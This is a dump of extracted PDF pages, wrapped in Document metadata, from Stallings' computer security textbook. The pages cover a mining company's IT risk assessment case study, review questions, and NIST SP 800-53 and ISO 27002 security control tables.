       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 506, 'page_label': '505'}, page_content='14.5 / CASE STUdY: SILVER STAR MINES  505\\nattack to the degree that modern systems can be. Often these systems are running \\nolder releases of operating systems with known insecurities. Many of these sys -\\ntems have not been patched or upgraded because the key applications they run \\nhave not been updated or validated to run on newer OS versions. More recently, \\nthe SCADA networks have been connected to the company’s intranet to provide \\nimproved management and monitoring capabilities. Recognizing that the SCADA \\nnodes are very likely insecure, these connections are isolated from the company \\nintranet by additional firewall and proxy server systems. Any external attack would \\nhave to break through the outer company firewall, the SCADA network firewall, \\nand these proxy servers in order to attack the SCADA nodes. This would require \\na series of security breaches. Nonetheless, given that the various computer crime \\nsurveys suggest that externally sourced attacks are increasing and known cases of \\nattacks on SCADA networks exist, the analyst concluded that while an attack was \\nvery unlikely, it could still occur. Thus, a likelihood rating of Rare was chosen. The \\nconsequence of the SCADA network suffering a successful attack was discussed \\nwith the mining engineers. They indicated that interference with the control system \\ncould have serious consequences as it could affect the safety of personnel in the \\nmine. Ventilation, bulk cooling, fire protection, hoisting of personnel and materials, \\nand underground fill systems are possible areas whose compromise could lead to a \\nfatality. Environmental damage could result from the spillage of highly toxic mate -\\nrials into nearby waterways. In addition, the financial impact could be significant, \\nas downtime is measured in tens of millions of dollars per hour. There is even a \\npossibility that Silver Star’s mining license might be suspended if the company was \\nfound to have breached its legal requirements. A consequence rating of Major was \\nselected. This results in a risk level of High.\\nThe second asset concerned the integrity of stored information. The analyst \\nnoted numerous reports of unauthorized use of file systems and databases in \\nrecent computer crime surveys. These assets could be compromised by both inter -\\nnal and external sources. These can be either the result of intentional malicious \\nor fraudulent acts, or the unintentional deletion, modification, or disclosure of \\ninformation. All indications are that such database security breaches are increas -\\ning and that access to such data is a primary goal of intruders. These systems are \\nlocated on the company intranet and hence are shielded by the company’s outer \\nfirewall from much external access. However, should that firewall be compro -\\nmised or an attacker gain indirect access using infected internal systems, com -\\npromise of the data was possible. With respect to internal use, the company had \\npolicies on the input and handling of a range of data, especially that required \\nfor audit purposes. The company also had policies on the backup of data from \\nservers. However, the large number of systems used to create and store this data, \\nboth desktop and server, meant that overall compliance with these policies was \\nunknown. Hence, a likelihood rating of Possible was chosen. Discussions with \\nsome of the company’s IT managers revealed that some of this information is con -\\nfidential and may cause financial harm if disclosed to others. There also may be \\nsubstantial financial costs involved with recovering data and other activities sub -\\nsequent to a breach. There is also the possibility of serious legal consequences if \\npersonal information was disclosed or if the results of statutory tests and process \\nM14_STAL0611_04_GE_C14.indd   505 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 507, 'page_label': '506'}, page_content='506  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\ninformation were lost. Hence, a consequence rating of Major was selected. This \\nresults in a risk level of Extreme.\\nThe availability or integrity of the key Financial, Procurement, and Main -\\ntenance/Production systems could be compromised by any form of attack on the \\noperating system or applications they use. Although their location on the company \\nintranet does provide some protection, due to the nature of the company structure \\na number of these systems have not been patched or maintained for some time. \\nThis means at least some of the systems would be vulnerable to a range of network \\nattacks if accessible. Any failure of the company’s outer firewall to block any such \\nattack could very likely result in compromise of some systems by automated attack \\nscans. These are known to occur very quickly, with a number of reports indicating \\nthat unpatched systems were compromised in less than 15 minutes after network \\nconnection. Hence, a likelihood of Possible was specified. Discussions with man -\\nagement indicated that the degree of harm would be proportional to extent and \\nduration of the attack. In most cases, a rebuild of at least a portion of the system \\nwould be required, at considerable expense. False orders being issued to suppliers \\nor the inability to issue orders would have a negative impact on the company’s \\nreputation and could cause confusion and possible plant shutdowns. Not being \\nable to process personnel time sheets and utilize electronic funds transfer and \\nunauthorized transfer of money would also affect the company’s reputation and \\npossibly result in a financial loss. The company indicated that the Maintenance/\\nProduction system’s harm rating should be a little lower due the ability of the \\nplant to continue to operate despite some compromise of the system. It would, \\nhowever, have a detrimental impact on the efficiency of operations. Consequence \\nratings of Moderate and Minor, respectively, were selected, resulting in risk levels \\nof High or Medium.\\nThe last asset is the availability, integrity, and confidentiality of mail services. \\nWithout an effective e-mail system, the company will operate with less efficiency. \\nA number of organizations have suffered failure of their e-mail systems as a result \\nof mass e-mailed worms in past years. New exploits transferred using e-mail are \\nreported. Those exploiting vulnerabilities in common applications are of major \\nconcern. The heavy use of e-mail by the company, including the constant exchange \\nand opening of e-mail attachments by employees, means the chance of compromise, \\nespecially by a zero-day exploit to a common document type, is very high. While \\nthe company does filter mail in its Internet gateway, there is a high probability that \\na zero-day exploit would not be caught. A denial of service attack against the mail \\ngateway is very hard to defend against. Hence, a likelihood rating of Almost Certain \\nwas selected in recognition of the wide range of possible attacks and the high chance \\nthat one will occur sooner rather than later. Discussions with management indicated \\nthat while other possible modes of communication exist, they do not allow for trans-\\nmission of electronic documents. The ability to obtain electronic quotes is a require-\\nment that must be met to place an order in the purchasing system. Reports and other \\ncommunications are regularly sent via this e-mail, and any inability to send or receive \\nsuch reports might affect the company’s reputation. There would also be financial \\ncosts and time needed to rebuild the e-mail system following a serious compromise. \\nBecause compromise would not have a large impact, a consequence rating of Minor \\nwas selected. This results in a risk level of High.\\nM14_STAL0611_04_GE_C14.indd   506 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 508, 'page_label': '507'}, page_content='14.6 / kEY TERMS, REVIEW QUESTIONS, ANd PROBLEMS  507\\nThe information was summarized and presented to management. All of the \\nresulting risk levels are above the acceptable minimum management specified as \\ntolerable. Hence, treatment is required. Even though the second asset listed had the \\nhighest level of risk, management decided that the risk to the SCADA network was \\nunacceptable if there was any possibility of death, however, remote. In addition, the \\nmanagement decided that the government regulator would not look favorably upon \\na company that failed to rate highly the importance of a potential fatality. Conse -\\nquently, the management decided to specify the risk to the SCADA as the highest \\npriority for treatment. The risk to the integrity of stored information was next. The \\nmanagement also decided to place the risk to the e-mail systems last, behind the \\nlower risk to the Maintenance/Production system, in part because its compromise \\nwould not affect the output of the mining and processing units and also because \\ntreatment would involve the company’s mail gateway, which was outside the man -\\nagement’s control.\\nThe final result of this risk assessment process is shown in Table 14.6, the result-\\ning overall risk register table. It shows the identified assets with the threats to them, \\nand the assigned ratings and priority. This information would then influence the selec-\\ntion of suitable treatments. Management decided the first five risks should be treated \\nby implementing suitable controls, which would reduce either the likelihood or the \\nconsequence should these risks occur. This process is discussed in the next chapter. \\nNone of these risks could be accepted or avoided. Responsibility for the final risk \\nto the e-mail system was found to be primarily with the parent company’s IT group, \\nwhich manages the external mail gateway. Hence, the risk is shared with that group.\\n 14.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nasset\\nconsequence\\ncontrol\\nIT security management\\nlevel of risk\\nlikelihood\\norganizational security policy\\nrisk\\nrisk appetite\\nrisk assessment\\nrisk register\\nthreat\\nthreat source\\nvulnerability\\nReview Questions\\n 14.1 State the main functions of IT security management.\\n 14.2 What are some of the functions of IT security management?\\n 14.3 State the difference between do and act steps of Plan-Do-Check-Act model.\\n 14.4 List some of the key national and international standards that provide guidance on IT \\nsecurity management and risk assessment.\\n 14.5 What are the key points that should be addressed by an organizational security policy?\\n 14.6 List some of the topics that should be addressed by an organizational security policy.\\nM14_STAL0611_04_GE_C14.indd   507 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 509, 'page_label': '508'}, page_content='508  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\n 14.7 List and briefly define the four approaches to identifying and mitigating IT risks.\\n 14.8 What ar e the advantages and disadvantages of using a Detailed Risk Analysis \\napproach?\\n 14.9 What is meant by risk appetite?\\n 14.10 Mention a few sources of human-made threat.\\n 14.11 Indicate who provides the key information when determining each of the key assets, \\ntheir likelihood of compromise, and the consequence should any be compromised.\\n 14.12 When evaluating possible human threat sources during a threat identification, what \\nare the five factors that should be considered for an attacker’s reason and capabilities \\nfor attacking an organization?\\n 14.13 Define consequence and likelihood.\\n 14.14 What is the simple equation for determining risk? Why is this equation not commonly \\nused in practice?\\n 14.15 What are the items specified in the risk register for each asset/threat identified?\\n 14.16 List and briefly define the five alternatives for treating identified risks.\\nProblems\\n 14.1 As part of a formal risk assessment of the IT system of your university, you have iden-\\ntified the asset “integrity of stored file and database information of all the students \\nand faculty stored on the server” and the threat “corruption, theft, loss of information \\nfrom server.” Suggest reasonable values for the items in the risk register for this asset \\nand threat with justifications for your choice.\\n 14.2 As part of a formal risk assessment of desktop systems in a small accounting firm with \\nlimited IT support, you have identified the asset “integrity of customer and financial \\ndata files on desktop systems” and the threat “corruption of these files due to import \\nof a worm/virus onto system.” Suggest reasonable values for the items in the risk reg-\\nister for this asset and threat, and provide justifications for your choices.\\n 14.3 As part of a formal risk assessment of the main file server for a hospital management \\nsystem, you have identified the asset “confidentiality of medical records of patients of \\nhospital on the server” and the threat “theft of medical information of patients.” Sug-\\ngest reasonable values for the items in the risk register for this asset and threat with \\njustifications for your choice.\\n 14.4 As part of a formal risk assessment of the external server in a small Web design com-\\npany, you have identified the asset “integrity of the organization’s Web server” and the \\nthreat “hacking and defacement of the Web server.” Suggest reasonable values for the \\nitems in the risk register for this asset and threat, and provide justifications for your \\nchoices.\\n 14.5 As part of a formal risk assessment of the main file server in an IT security consultancy \\nfirm, you have identified the asset “confidentiality of techniques used to conduct pen-\\netration tests on customers, and the results of conducting such tests for clients, which \\nare stored on the server” and the threat “theft/breach of this confidential and sensitive \\ninformation by either an external or internal source.” Suggest reasonable values for \\nthe items in the risk register for this asset and threat, and provide justifications for \\nyour choices.\\n 14.6 As part of a formal risk assessment on the use of laptops by employees of a large \\ngovernment department, you have identified the asset “confidentiality of personnel \\ninformation in a copy of a database stored unencrypted on the laptop” and the threat \\n“theft of personal information, and its subsequent use in identity theft caused by the \\ntheft of the laptop.” Suggest reasonable values for the items in the risk register for this \\nasset and threat, and provide justifications for your choices.\\nM14_STAL0611_04_GE_C14.indd   508 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 510, 'page_label': '509'}, page_content='14.6 / kEY TERMS, REVIEW QUESTIONS, ANd PROBLEMS  509\\n 14.7 As part of a formal risk assessment process for a small e-commer ce firm, suggest \\nsome\\xa0threats that such a firm is exposed to.\\n 14.8 A copy of the original version of NIST SP 80 0-30 from 2002 is available at box.com/\\nCompSec4e. Compare Tables 3.4 to 3.7 from that document which specify levels of \\nlikelihood, consequence, and risk, with our equivalent Tables 14.2–14.4 in this chapter. \\nWhat are the key differences? What is the effect on the level of detail in risk assess -\\nments using these alternate tables? Why do you think the NIST tables were changed \\nsignificantly in the latest version?\\nM14_STAL0611_04_GE_C14.indd   509 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 511, 'page_label': '510'}, page_content='15.1 IT Security Management Implementation\\n15.2 Security Controls or Safeguards\\n15.3 IT Security Plan\\n15.4 Implementation of Controls\\nImplementation of Security Plan\\nSecurity Awareness and Training\\n15.5 Monitoring Risks\\nMaintenance\\nSecurity Compliance\\nChange and Configuration Management\\nIncident Handling\\n15.6 Case Study: Silver Star Mines\\n15.7 Key Terms, Review Questions, and Problems\\nIT Security Controls, Plans, \\nand Procedures\\nCHAPTER \\n \\n510\\nM15_STAL0611_04_GE_C15.indd   510 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 512, 'page_label': '511'}, page_content='15.2 / SECURITY CONTROLS OR SAFEGUARDS  511\\nIn Chapter 14, we introduced IT security management as a formal process to ensure \\nthat critical assets are sufficiently protected in a cost-effective manner. We then \\ndiscussed the critical risk assessment process. This chapter continues the examina -\\ntion of IT security management. We survey the range of management, operational, \\nand technical controls or safeguards available that can be used to improve security \\nof IT systems and processes. We then explore the content of the security plans that \\ndetail the implementation process. These plans must then be implemented, with \\ntraining to ensure that all personnel know their responsibilities, and monitoring to \\nensure compliance. Finally, to ensure that a suitable level of security is maintained, \\nmanagement must follow up the implementation with an evaluation of the effec -\\ntiveness of the security controls and an iteration of the entire IT security manage -\\nment process.\\n 15.1 IT SECURITY MANAGEMENT IMPLEMENTATION\\nWe introduced the IT security management process in Chapter 14, illustrated by \\n Figure 14.1. Chapter 14 focused on the earlier stages of this process. In this chapter, we \\nfocus on the latter stages, which include selecting controls, developing an implemen-\\ntation plan, and the follow-up monitoring of the plan’s implementation. We broadly \\nfollow the guidance provided in NIST SP 800-39 ( Managing Information Security \\nRisk: Organization, Mission, and Information System View, March 2011), which was \\ndeveloped by NIST in 2011 as the flagship document for providing guidance for an \\nintegrated, organization-wide program for managing information security risk, in \\nresponse to FISMA. A broad summary of these steps is given in Figure 15.1. We will \\ndiscuss each of these in turn.\\n 15.2 SECURITY CONTROLS OR SAFEGUARDS\\nA risk assessment on an organization’s IT systems identifies areas needing treatment. \\nThe next step, as shown in Figure 14.1 on risk analysis options, is to select suitable \\ncontrols to use in this treatment. An IT security control, safeguard, or  countermeasure \\n(the terms are used interchangeably) helps to reduce risks. We use the following \\ndefinition:\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ List the various categories and types of controls available.\\n ◆ Outline the process of selecting suitable controls to address risks.\\n ◆ Outline an implementation plan to address identified risks.\\n ◆ Understand the need for ongoing security implementation follow-up.\\nM15_STAL0611_04_GE_C15.indd   511 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 513, 'page_label': '512'}, page_content='512  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nSome controls address multiple risks at the same time, and selecting such controls can \\nbe very cost effective. Controls can be classified as belonging to one of the following \\nclasses (although some controls include features from several of these):\\n• Management controls:  Focus on security policies, planning, guidelines, and \\nstandards that influence the selection of operational and technical controls to \\nreduce the risk of loss and to protect the organization’s mission. These controls \\nrefer to issues that management needs to address. We discuss a number of these \\nin Chapters 14 and 15.\\n• Operational controls: Address the correct implementation and use of security \\npolicies and standards, ensuring consistency in security operations and correct-\\ning identified operational deficiencies. These controls relate to mechanisms \\nand procedures that are primarily implemented by people rather than systems. \\nFigure 15.1 IT Security Management Controls and Implementation\\nStep 2: Respond to risks\\nEvaluate recommended control options\\nDetermine risk response\\nSelect controls\\nDevelop implementation plan\\nImplement selected controls\\nStep 1: Prioritize risks\\nManagement review of risk register\\nStep 3: Monitor risks\\n(accept, avoid, mitigate, share)\\ncontrol: An action, device, procedure, or other measure that reduces risk by \\n eliminating or preventing a security violation, by minimizing the harm it can cause, \\nor by discovering and reporting it to enable corrective action.\\nM15_STAL0611_04_GE_C15.indd   512 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 514, 'page_label': '513'}, page_content='15.2 / SECURITY CONTROLS OR SAFEGUARDS  513\\nThey\\xa0are used to improve the security of a system or group of systems. We will \\n discuss some of these in Chapters 16 and 17 .\\n• Technical controls: Involve the correct use of hardware and software security \\ncapabilities in systems. These range from simple to complex measures that work \\ntogether to secure critical and sensitive data, information, and IT systems func-\\ntions. Figure 15.2 illustrates some typical technical control measures. Parts One \\nand Two in this text discussed aspects of such measures.\\nIn turn, each of these control classes may include the following:\\n• Supportive controls: Pervasive, generic, underlying technical IT security capa-\\nbilities that are interrelated with, and used by, many other controls.\\n• Preventative controls: Focus on preventing security breaches from occurring, by \\ninhibiting attempts to violate security policies or exploit a vulnerability.\\n• Detection and recovery controls: Focus on the response to a security breach, by \\nwarning of violations or attempted violations of security policies or the identi-\\nfied exploit of a vulnerability and by providing means to restore the resulting \\nlost computing resources.\\nThe technical control measures shown in Figure 15.2 include examples of each of \\nthese types of controls.\\nFigure 15.2 Technical Security Controls\\nSupport\\nAuthentication\\nAuthorization\\nUser\\nor\\nprocess\\nAccess control\\nenforcement\\nTransaction\\nprivacy Non\\nrepudiation\\nProof of\\nwholeness\\nIdentiﬁcation\\nCryptographic key management\\nSecurity administration\\nSystem protections\\n(least privilege, object reuse, process separation, etc.)\\nProtected communication\\n(safe from disclosure, substitution, modiﬁcation, and replay)\\nAudit\\nPrevent\\nResource\\nDetect recover\\nIntrusion detection\\nand containment\\nState restore\\nM15_STAL0611_04_GE_C15.indd   513 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 515, 'page_label': '514'}, page_content='514  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nLists of controls are provided in a number of national and international \\n standards, including ISO 27002 ( Code of practice for information security manage -\\nment, 2013), ISO 13335 (Management of information and communications technology \\nsecurity, 2004), FIPS 200 ( Minimum Security Requirements for Federal Information \\nand Information Systems, March 2006) and NIST SP 800-53 (Recommended Security \\nControls for Federal Information  Systems, January 2015). There is broad agreement \\namong these and other standards as to the types of controls that should be used and \\nthe detailed lists of typical controls. Indeed many of the standards cross-reference each \\nother, indicating their agreement on these lists. ISO 27002 is generally regarded as the \\nmaster list of controls and is cited by most other standards. Table 15.1 (adapted from \\nTable 1 in NIST SP 800-53) is a typical list of families of controls within each of the \\nclasses. Compare this with the list in Table 15.2, which details the categories of controls \\ngiven in ISO 27002, and with Table 1.4 which lists controls from FIPS 200, noting the \\nhigh degree of overlap. Within each of these control classes, there is a long list of spe-\\ncific controls that may be chosen. Table 15.3 (adapted from the tables in Appendix\\xa0D \\nand\\xa0G of NIST SP 800-53) itemizes the full list of controls detailed in this standard.\\nTo attain an acceptable level of security, some combination of these controls \\nshould be chosen. If the baseline approach is being used, an appropriate baseline set \\nof controls is typically specified in a relevant industry or government standard. For \\nexample, Appendix D in NIST SP 800-53 lists selections of baseline controls for use \\nin low-, moderate-, and high-impact IT systems. A selection should be made that is \\nappropriate to the organization’s overall risk profile, resources, and capabilities. These \\nClass Control Family\\nManagement Planning\\nManagement Program Management\\nManagement Risk Assessment\\nManagement Security Assessment and Authorization\\nManagement System and Services Acquisition\\nOperational Awareness and Training\\nOperational Configuration Management\\nOperational Contingency Planning\\nOperational Incident Response\\nOperational Maintenance\\nOperational Media Protection\\nOperational Personnel Security\\nOperational Physical and Environmental Protection\\nOperational System and Information Integrity\\nTechnical Access Control\\nTechnical Audit and Accountability\\nTechnical Identification and Authentication\\nTechnical System and Communications Protection\\nTable 15.1 NIST SP 800-53 Security Controls\\nM15_STAL0611_04_GE_C15.indd   514 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 516, 'page_label': '515'}, page_content='15.2 / SECURITY CONTROLS OR SAFEGUARDS  515\\nControl Category Objective\\nSecurity Policies To provide management direction and support for information security in \\n accordance with business requirements and relevant laws and regulations.\\nOrganization of \\nInformation Security\\nTo establish a management framework to initiate and control the implementation \\nand operation of information security within the organization; to ensure the security \\nof teleworking and use of mobile devices.\\nHuman Resource \\nSecurity\\nTo ensure that employees and contractors understand their responsibilities and are \\nsuitable for the roles for which they are considered; to ensure that employees and \\ncontractors are aware of and fulfill their information security responsibilities; to \\nprotect the organization’s interests as part of the process of changing or terminating \\nemployment.\\nAsset Management To identify organizational assets and define appropriate protection responsibilities; \\nto ensure that information receives an appropriate level of protection in  accordance \\nwith its importance to the organization; to prevent unauthorized disclosure, \\n modification, removal or destruction of information stored on media.\\nAccess Control To limit access to information and information processing facilities; to ensure \\n authorized user access and to prevent unauthorized access to systems and services; to \\nmake users accountable for safeguarding their authentication information; to prevent \\nunauthorized access to systems and applications.\\nCryptography To ensure proper and effective use of cryptography to protect the confidentiality, \\nauthenticity and/or integrity of information.\\nPhysical and \\n Environmental \\nSecurity\\nTo prevent unauthorized physical access, damage, and interference to the organiza-\\ntion’s information and information processing facilities; to prevent loss, damage, theft \\nor compromise of assets and interruption to the organization’s operations.\\nOperations Security To ensure correct and secure operations of information processing facilities; to \\nensure that information and information processing facilities are protected against \\nmalware; to protect against loss of data; to record events and generate evidence; \\nto ensure the integrity of operational systems; to prevent exploitation of technical \\n vulnerabilities; to minimise the impact of audit activities on operational systems.\\nCommunications \\nSecurity\\nTo ensure the protection of information in networks and its supporting information \\nprocessing facilities; to maintain the security of information transferred within an \\norganization and with an external entity.\\nSystem Acquisition, \\nDevelopment, and \\nMaintenance\\nTo ensure that information security is an integral part of information systems across \\nthe entire lifecycle, including the requirements for information systems which \\n provide services over public networks; to ensure that information security is designed \\nand implemented within the development lifecycle of information systems; to ensure \\nthe protection of data used for testing.\\nSupplier \\nRelationships\\nTo ensure protection of the organization’s assets that are accessible by suppliers; to \\nmaintain an agreed level of information security and service delivery in line with \\nsupplier agreements.\\nInformation Security \\nIncident Management\\nTo ensure a consistent and effective approach to the management of information \\nsecurity incidents, including communication on security events and weaknesses.\\nInformation Security \\nContinuity\\nTo embed IT continuity in the organization’s business continuity management \\n systems; to ensure availability of information processing facilities.\\nCompliance To avoid breaches of legal, statutory, regulatory, or contractual obligations related \\nto information security and of any security requirements; to ensure that information \\nsecurity is implemented and operated in accordance with the organizational policies \\nand procedures.\\nTable 15.2 ISO/IEC 27002 Security Controls\\nM15_STAL0611_04_GE_C15.indd   515 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 517, 'page_label': '516'}, page_content='516  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nAccess Control\\nAccess Control Policy and Procedures, Account Management, Access Enforcement, Information \\nFlow  Enforcement, Separation of Duties, Least Privilege, Unsuccessful Login Attempts, System Use \\n Notification,\\xa0Previous Logon (Access) Notification, Concurrent Session Control, Session Lock, Session \\n Termination,  Permitted Actions without Identification or Authentication, Security Attributes, Remote \\nAccess,\\xa0Wireless Access, Access Control for Mobile Devices, Use of External Information Systems, \\n Information  Sharing,  Publicly Accessible Content, Data Mining Protection, Access Control Decisions, \\n Reference Monitor\\nAwareness and Training\\nSecurity Awareness and Training Policy and Procedures, Security Awareness, Training, Role-Based Security \\nTraining, Security Training Records\\nAudit and Accountability\\nAudit and Accountability Policy and Procedures, Audit Events, Content of Audit Records, Audit Storage \\nCapacity, Response to Audit Processing Failures, Audit Review, Analysis, and Reporting, Audit Reduction and \\nReport Generation, Time Stamps, Protection of Audit Information, Nonrepudiation, Audit Record  Retention, \\nAudit Generation, Monitoring for Information Disclosure, Session Audit, Alternate Audit Capability, \\n Cross-Organizational Auditing\\nSecurity Assessment and Authorization\\nSecurity Assessment and Authorization Policies and Procedures, Security Assessments, System \\n Interconnections, Plan of Action and Milestones, Security Accreditation, Continuous Monitoring, \\n Penetration\\xa0Testing, Internal System Connections\\nConfiguration Management\\nConfiguration Management Policy and Procedures, Baseline Configuration, Configuration Change  Control, \\nSecurity Impact Analysis, Access Restrictions for Change, Configuration Settings, Least Functionality, \\n Information System Component Inventory, Configuration Management Plan, Software Usage Restrictions, \\nUser-Installed Software\\nContingency Planning\\nContingency Planning Policy and Procedures, Contingency Plan, Contingency Training, Contingency Plan \\nTesting, Alternate Storage Site, Alternate Processing Site, Telecommunications Services, Information System \\nBackup, Information System Recovery and Reconstitution, Alternate Communications Protocols, Safe Mode, \\nAlternative Security Mechanisms\\nIdentification and Authentication\\nIdentification and Authentication Policy and Procedures, Identification and Authentication ( Organizational \\nUsers), Device Identification and Authentication, Identifier Management, Authenticator Management, Authen-\\nticator Feedback, Cryptographic Module Authentication, Identification and Authentication ( Nonorganizational \\nUsers), Service Identification and Authentication, Adaptive Identification and Authentication, Re-authentication\\nIncident Response\\nIncident Response Policy and Procedures, Incident Response Training, Incident Response Testing, Incident \\nHandling, Incident Monitoring, Incident Reporting, Incident Response Assistance, Incident Response Plan, \\nInformation Spillage Response, Integrated Information Security Analysis Team\\nMaintenance\\nSystem Maintenance Policy and Procedures, Controlled Maintenance, Maintenance Tools, Nonlocal \\n Maintenance, Maintenance Personnel, Timely Maintenance\\nMedia Protection\\nMedia Protection Policy and Procedures, Media Access, Media Marking, Media Storage, Media Transport, \\nMedia Sanitization, Media Use, Media Downgrading\\nTable 15.3 Detailed NIST SP 800-53 Security Controls\\nM15_STAL0611_04_GE_C15.indd   516 10/11/17   3:09 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
